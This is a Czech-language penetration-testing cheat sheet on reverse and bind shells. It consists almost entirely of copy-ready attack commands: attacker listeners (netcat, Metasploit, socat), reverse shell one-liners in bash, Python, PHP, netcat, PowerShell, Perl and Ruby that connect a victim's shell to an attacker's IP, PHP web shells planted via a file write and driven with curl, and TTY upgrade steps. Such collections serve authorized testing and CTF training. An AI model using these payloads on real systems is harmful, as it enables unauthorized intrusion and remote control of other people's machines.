# Reverse Shells & Bind Shells

## Koncepty

**Reverse shell**: oběť se připojuje k útočníkovi
**Bind shell**: útočník se připojuje k oběti

## Listener (útočník)

```bash
# Základní netcat listener
nc -lvnp 4444

# Stabilnější s rlwrap (history, šipky)
rlwrap nc -lvnp 4444

# Metasploit handler
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

## Reverse Shell One-liners

### Bash
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

# Přes /dev/udp
bash -i >& /dev/udp/<IP>/<PORT> 0>&1
```

### Python
```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```bash
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP web shell
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

### Netcat
```bash
nc -e /bin/bash <IP> <PORT>
nc -e /bin/sh <IP> <PORT>

# Bez -e (OpenBSD nc)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

### PowerShell (Windows)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Perl
```bash
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Upgrade na plný TTY (Linux)

Po získání reverse shellu je třeba upgrade pro stabilitu:

```bash
# Metoda 1: Python
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z (background)
stty raw -echo; fg
# Enter, Enter
export TERM=xterm

# Metoda 2: script
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm SHELL=bash

# Metoda 3: socat
# Na útočníkovi:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Na oběti:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444
```

## Web Shells

```bash
# PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Přístup:
curl "http://<IP>/shell.php?cmd=id"
curl "http://<IP>/shell.php?cmd=which+nc"
```

## Generátor shellu
Použij: https://www.revshells.com/

## Socat
```bash
# Listener
socat TCP-L:<PORT> -

# Reverse shell
socat TCP:<IP>:<PORT> EXEC:bash
```
